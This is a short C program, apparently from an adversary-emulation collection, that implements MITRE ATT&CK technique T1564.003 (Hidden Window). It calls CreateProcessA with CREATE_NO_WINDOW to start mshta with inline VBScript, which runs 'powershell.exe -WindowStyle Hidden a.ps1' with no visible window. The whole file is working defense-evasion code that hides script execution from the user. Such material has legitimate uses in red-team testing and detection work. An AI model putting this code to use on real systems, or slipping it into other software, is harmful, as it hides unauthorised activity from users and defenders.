// Link      = https://attack.mitre.org/techniques/T1564/003/
// Technique = Hide Artifacts: Hidden Window
// ID        = T1564.003
// Tactics   = Defense Evasion

#include <windows.h>

#define RUN(to_run) \
    si.cb = sizeof(STARTUPINFOA); \
    if (CreateProcessA(NULL, (LPSTR)"mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run(\"\"" to_run "\"\",0)(window.close)\")",\
     NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) { \
        WaitForSingleObject(pi.hProcess, INFINITE); \
        CloseHandle(pi.hProcess); \
        CloseHandle(pi.hThread); \
    }

STARTUPINFOA si;
PROCESS_INFORMATION pi;

int main() {
    RUN("powershell.exe -WindowStyle Hidden a.ps1");

    return 0;
}
